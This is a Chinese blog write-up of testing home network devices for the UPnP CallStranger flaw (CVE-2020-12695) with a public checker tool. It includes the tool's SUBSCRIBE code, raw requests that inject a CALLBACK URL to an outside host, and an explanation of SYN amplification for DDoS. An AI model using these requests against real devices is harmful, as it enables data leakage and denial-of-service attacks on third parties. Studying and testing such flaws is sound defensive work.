## 起因

周末正要使用前不久刚装上的某企鹅电视盒子看剧，突然想到电视盒子也是需要网络的，于是就对电视盒子开始了测试之路。

### 上路

首先看一下ip地址，192.168.101.22

![](https://image.3001.net/images/20200810/1597031512.jpg!small)

首先想到的是命令执行，经过一番操作发现并不存在，看来系统都是升级了的。

扫描端口发现49152端口打开，详细扫描发现是Upnp服务

![](https://image.3001.net/images/20200810/1597031759.png!small)

突然想到了今年6月的UPnP协议漏洞CVE-2020-12695，UPnP
2020-04-17之前版本中存在安全漏洞。攻击者可借助SUBSCRIBE功能利用该漏洞将流量发送到任意位置，导致拒绝服务或数据泄露。UPnP全称为Universal
Plug and
Play，即通用即插即用，UPnP允许各种网络设备在没有任何特殊设置或配置的情况下进行通信，使设备彼此可自动连接和协同工作。在UPnP协议规范中有一个非常重要的功能模块，叫做事件(Eventing)。在UPnP服务进行的时间内，只要设备用于UPnP服务的变量值发生变化或者模式发生了改变，就会产生一个事件，随之向整个网络进行广播。或者用户可以事先向UPnP设备发送订阅请求，保证UPnP设备及时地将事件传送过来。

关于UPnP的NT与CALLBACK订阅模块有如下格式：

![](https://image.3001.net/images/20200810/1597031838.png!small)

CALLBACK的值一般为回调地址的URL。NT取upnp:event表示订阅事件。

UPnP协议规范文档中提到：CALLBACK是必填区域，所填信息为发送事件信息的URL。一般情况下为UPnP供应商指定。如果其中定义了不止一个URL，设备会按顺序尝试连接，直到有一个连接成功。每个URL一般为HTTP协议(即前缀为”http://”)。

验证工具：[
_https://github.com/yunuscadirci/CallStranger_](https://github.com/yunuscadirci/CallStranger)

解压后进入CallStranger目录

安装工具python3 setup.py install

安装完之后接下来开始利用：

利用之前先看一下这个工具的部分代码：

    
    
    def subscribe(URL,callbackURL):
    	myheaders = {
    	'User-Agent':'Callstranger Vulnerability Checker',
        'CALLBACK': '<'+callbackURL+'>',
        'NT': 'upnp:event',
        'TIMEOUT': 'Second-300'} 
    	#print(URL,callbackURL,'sending')
    	req = requests.request('SUBSCRIBE', URL,headers=myheaders)
    	if req.status_code==200:
    		print(colored('Subscribe to '+URL+' seems successfull','green'))
    		print(req.headers)
    		print(req.text)
    	else:
    		print(colored('Subscribe to '+URL+' failed with status code:'+str(req.status_code),'red'))
    		print(req.headers)
    		print(req.text)  
      
    

首先对目标进行subscribe订阅请求，并从header里加入一个CALLBACK的值来进行回调，CALLBACK的值为指定的url，如果订阅成功就会返回200，表示订阅成功，很可能存在漏洞。

对当前网络进行扫描和测试：python3 CallStranger.py

找到了三个Upnp设备：华为路由器、客厅盒子、客厅极光TV

![](https://image.3001.net/images/20200810/1597032087.png!small)

如下图，扫描利用完毕，标记为红色的是确定有漏洞得，标记为黄色的是疑似的。

![](https://image.3001.net/images/20200810/1597032145.png!small)

接下来我们通过流量分析来看看具体干了哪些事情。

如下图，首先回调的设备需要一个自己的session

![](https://image.3001.net/images/20200810/1597032225.png!small)

然后通过将获得的session值加入到token里再次put请求得到一组key值

    
    
    PUT /CallStranger.php?c=getservices&token=xxx HTTP/1.1
    Host: 20.42.105.45
    User-Agent: python-requests/2.22.0
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    Content-Length: 0

![](https://image.3001.net/images/20200810/1597032315.png!small)

然后再将获取到的token和key值加入到SUBSCRIBE请求的回调值里进行请求：

    
    
    SUBSCRIBE /_urn:schemas-upnp-org:service:AVTransport_event HTTP/1.1
    Host: 192.168.101.22:49152
    User-Agent: Callstranger Vulnerability Checker
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    CALLBACK: <http://20.42.105.45:80/CallStranger.php?c=addservice&service=gAAAAABfH-vGuHsXhAuU73sw.........=&token=........>
    NT: upnp:event
    TIMEOUT: Second-300
    Content-Length: 0

![](https://image.3001.net/images/20200810/1597032370.png!small)

服务器返回200表示回调的值可以被利用，存在此漏洞，由于CALLBACK并不限定数量，如果回调值里加入多个url，可造成Ddos攻击，Upnp的官方文档里也给出了说明：

每个回调值向回调值指定的主机发送107个SYN包。在107个SYN包之后，它尝试

连接下一个值。这意味着每25字节就有107*60字节的TCP
SYN流量。我们可以计算一下放大的倍数：107*60/25=256，也就是说1个回调值放大256倍，如果采用多个回调值可进行无限放大。

![](https://image.3001.net/images/20200810/1597032482.png!small)![](https://image.3001.net/images/20200810/1597032509.png!small)

如果返回412，说明回调值不可利用，不存在此漏洞，前面的扫描结果也说明了这一点。

![](https://image.3001.net/images/20200810/1597032540.png!small)

### 总结

总的来说，回调值如果被利用了后果还是挺严重的，如果没有必要，最好关闭UPnP端口。看来电视盒子定期也要更新系统啊，否则为什么定期弹窗让升级系统呢？在最新更新的UPnP协议规范中，可以看出开发者限制了订阅事件的源IP和目标IP都必须在内网中，这从一定程度上修复了该漏洞。

